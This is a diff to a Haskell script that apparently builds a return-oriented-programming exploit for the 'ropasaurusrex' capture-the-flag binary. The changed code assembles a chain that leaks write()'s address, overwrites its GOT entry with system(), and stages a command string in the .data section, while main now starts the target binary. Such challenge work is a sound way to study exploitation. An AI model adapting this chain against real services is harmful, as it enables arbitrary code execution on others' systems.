@@ -1,5 +1,5 @@
 #!/usr/bin/env stack
--- stack --resolver=nightly-2015-07-08 runghc --package=shelly --package=bytestring --package=text --package=binary --package=unix
+-- stack --resolver=lts-3.11 runghc --package=shelly --package=bytestring --package=text --package=binary --package=unix --package=conduit-extra
 
 -- This gives us an experience similar to @ghci@.  Raw values (1 and
 -- 10 below) that implement the 'Num' type class will be defaulted to 'Int'
@@ -14,7 +14,7 @@
 --            arising from the literal ‘"-alF"’
 -- @
 {-# LANGUAGE ExtendedDefaultRules #-}
-{-# LANGUAGE OverloadedStrings    #-}
+{-# LANGUAGE OverloadedStrings #-}
 {-# OPTIONS_GHC -Wall #-}
 
 -- Don't warn that things (like strings and numbers) are being defaulted to
@@ -26,6 +26,7 @@ import Data.Binary (encode)
 import qualified Data.ByteString.Lazy as B
 import Data.ByteString.Lazy (ByteString)
 import Data.Char (chr, ord)
+import Data.Conduit.Process (streamingProcess)
 import Data.Int (Int64)
 import Data.Monoid ((<>))
 import qualified Data.Text as T
@@ -95,47 +96,43 @@ popPopPopRetAddr = toAddr 0x080484b6
 -- to pass to system().
 paddedExploit :: ByteString
 paddedExploit = nops
-    <> encode writeAddrPLT
+    <> encode writeAddrPLT          -- print out address of write() to stdout.
         <> encode popPopPopRetAddr
         <> encode (toAddr 1)
         <> encode writeAddressGOT
         <> encode (toAddr 4)
-    <> encode readAddrPLT
+    <> encode readAddrPLT           -- read in computed location of system()
+                                    -- into write()'s GOT.
         <> encode popPopPopRetAddr
         <> encode (toAddr 0)
         <> encode writeAddressGOT
         <> encode (toAddr 4)
+    <> encode readAddrPLT           -- read in 8 character string to feed to
+                                    -- system().
+        <> encode popPopPopRetAddr
+        <> encode (toAddr 0)
+        <> encode (toAddr 0x8049620) -- this is the .data section.
+                                      -- we could also use the .bss
+                                      -- at 0x08049628.
+        <> encode (toAddr 8)
     <> encode writeAddrPLT -- this should be pointing to system()
         <> B.replicate 4 nop
-        <> encode (toAddr 0) -- TODO: what should these args be?
+        <> encode (toAddr 0x8049620) -- TODO: what should these args be?
 
 main :: IO ()
 main = do
-    -- print "going..."
-    -- rawSystem "./level05" [paddedExploitString]
-    -- callProcess "./level05" [paddedExploitString]
-    -- callProcess "gdb" ["./level05", "--args", paddedExploitString]
-    -- executeFile "echo" True ["./level05", "--args", paddedExploitString] Nothing
-    -- executeFile "gdb" True ["./level05", "--args", paddedExploitString] Nothing
-    -- executeFile "stack" True ["--resolver=nightly-2015-07-08", "ghci", "breaker.hs", paddedExploitString] Nothing
-    -- let firstArg = turnIntoEscapedBashString $ take 40 paddedExploitString
-    --     secondArg = turnIntoEscapedBashString $ drop 40 paddedExploitString
-    -- putStrLn $ "LANG=fr gdb -command test.gdb --args ./level06 " ++ firstArg ++ " " ++ secondArg
-    -- putStrLn $ "gdb --args ./level09 " ++ turnIntoEscapedBashString paddedExploitString
-    -- print "ended."
-    B.putStrLn paddedExploit
+    B.hPutStr stderr "\n"
+    B.hPutStr stderr "---------------\n"
+    B.hPutStr stderr "-- Started. --\n"
+    B.hPutStr stderr "---------------\n\n"
+
+    (pStdin, pStdout, _, _) <- streamingProcess $
+        shell "./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"
+
+    -- B.putStrLn paddedExploit
 
     B.hPutStr stderr "\n"
     B.hPutStr stderr "---------------\n"
     B.hPutStr stderr "-- Finished. --\n"
     B.hPutStr stderr "---------------\n\n"
 
--- main = shelly $
---     withTmpDir $ \temp -> do
---         forM_ [1..10] $ \i ->
---             touchfile $ temp </> show i <.> "txt"
---         inspect temp
---         void $ cmd "ls" "-alF" temp
---         void $ cmd "find" temp
---         void $ cmd "echo" "here is my try at grepping:"
---         void $ cmd "ls" "-alF" temp -|- cmd "grep" "10\\.txt"
